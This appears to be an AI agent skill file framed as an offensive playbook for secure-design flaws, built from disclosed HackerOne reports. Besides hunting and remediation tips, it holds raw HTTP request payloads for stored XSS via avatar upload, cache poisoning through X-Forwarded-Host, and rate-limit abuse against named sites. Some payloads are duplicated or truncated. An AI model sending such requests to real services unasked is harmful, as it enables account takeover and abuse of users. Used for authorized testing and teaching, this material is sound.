---
name: secure-design
description: "Violation of Secure Design Principles offensive playbook from 116 disclosed HackerOne reports (5 critical, 9 high, 35 medium, 67 low). Use when hunting or reviewing violation of secure design principles. Triggers: email, allowed, attacker, password, access."
license: "For authorized security testing and education only."
---

# Violation of Secure Design Principles

> Distilled from **116** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Architecture-level mistakes  -  security through obscurity, trust of client-side checks, missing defense in depth, or designs that cannot be made safe by a local patch alone.

## Where to hunt

- Identify decisions that put secrets or authz only on the client; features that cannot be rate-limited or audited; shared secrets across tenants.
- Look for 'hidden' admin URLs, predictable object refs used as the only control, and features that skip threat modeling.

## Exploitation playbook

- Ignore the UI and call the API directly; reverse engineer 'secret' tokens; abuse a design that trusts the caller.

## Bypass techniques

- Anything the client can see or alter is not a control.

## Impact & escalation

- Systemic bypasses that affect every user or every tenant.

## Remediation

- Move controls server-side, assume clients are hostile, add defense in depth, redesign unsafe workflows.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#780285](https://hackerone.com/reports/780285)  -  [h1-415 2020] H1-415 CTF Writeup by W--
*critical*

```http
POST /register HTTP/1.1
Host: h1-415.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Cookie: _csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384; session=eyJfY3NyZl90b2tlbiI6IjQwNzg0OW…

name=demo&email=jobert%40mydocz.cosmic<<<&username=demo&password=password123&password-confirmation=password123&_csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384
```

### 2. [#964550](https://hackerone.com/reports/964550)  -  XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
*low*

```http
POST /accounts/141376700 HTTP/1.1
Host: accounts.shopify.com
Referer: https://accounts.shopify.com/accounts/141376700
Content-Type: multipart/form-data; boundary=---------------------------20426576427959059782120179951
Content-Length: 13530
Origin: https://accounts.shopify.com
Cookie: device_id=; _identity_session; __Host-_identity_session_same_site=; _y=; _shopify_y=; _s=; _…
```

### 3. [#280534](https://hackerone.com/reports/280534)  -  No Rate Limit on account deletion request(Leads to huge email flood…
*low*

```http
POST /api/requests/account_delete HTTP/1.1
Host: infogram.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Cookie: ab=a11; _ga=GA1.2.229897234.1508421432; _paths=https%3A%2F%2Finfogram.com%2F%2Chttps%3A%2F%2…

_csrf=ChZ8Uvl8-yz07Pxjz87VrMV4wMbMTi8JmELI
```

### 4. [#964550](https://hackerone.com/reports/964550)  -  XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
*low*

```http
POST /accounts/141376700 HTTP/1.1
Host: accounts.shopify.com
Referer: https://accounts.shopify.com/accounts/141376700
Content-Type: multipart/form-data; boundary=---------------------------20426576427959059782120179951
Content-Length: 13530
Origin: https://accounts.shopify.com
Cookie: device_id=; _identity_session; __Host-_identity_session_same_site=; _y=; _shopify_y=; _s=; _…

-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="utf8"

â
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="_method"

patch
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="authenticity_token"

0HXXr+2RHm5QwSvfF4MkpkyouUXgM8Dl/xxxxxx+w+78GWOFVLxSqTOpswgegMl3DgEgKHsV5Qw==
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="account[avatar]"; filename="xss_comment_exif_metadata_double_quote.png"
Content-Type: text/html

PNG

```

### 5. [#504514](https://hackerone.com/reports/504514)  -  Web cache poisoning leads to disclosure of CSRF token and sensitive…
*medium*

```http
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794; smule_cookie_banne…
```

### 6. [#504514](https://hackerone.com/reports/504514)  -  Web cache poisoning leads to disclosure of CSRF token and sensitive…
*medium*

```http
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794; smule_cookie_banne…

'''
```

More payloads: see [payloads.md](payloads.md) (54 curated).

## Recurring patterns in this dataset

Most frequent terms across the 116 reports (term (count)): `email` (39), `allowed` (32), `attacker` (30), `password` (22), `access` (18), `cache` (15), `discovered` (15), `page` (14), `website` (14), `victim` (13), `rate` (12), `limit` (12), `link` (11), `attackers` (11), `information` (11), `token` (11), `attack` (11), `web` (10)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#825643](https://hackerone.com/reports/825643) | critical |  -  | stagingdoteverydotorg | Flaw in Change Email https://youtu.be/MMvlcHIGs2A |
| [#780285](https://hackerone.com/reports/780285) | critical |  -  | h1-ctf | [h1-415 2020] H1-415 CTF Writeup by W-- |
| [#894863](https://hackerone.com/reports/894863) | critical |  -  | h1-ctf | [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account an… |
| [#887993](https://hackerone.com/reports/887993) | critical |  -  | h1-ctf | [H1-2006 2020] CTF |
| [#895587](https://hackerone.com/reports/895587) | critical |  -  | h1-ctf | [H1-2006 2020] How I solved my first H1 CTF |
| [#835437](https://hackerone.com/reports/835437) | high | $1,000 | playstation | Access Token Smuggling from my.playstation.com via Referer Header |
| [#826394](https://hackerone.com/reports/826394) | high | $1,000 | playstation | Authorization Token on PlayStation Network Leaks via postMessage function |
| [#1040047](https://hackerone.com/reports/1040047) | high |  -  | automattic | Email Verification bypass on signup |

*See [reference.md](reference.md) for all 116 reports in this class.*
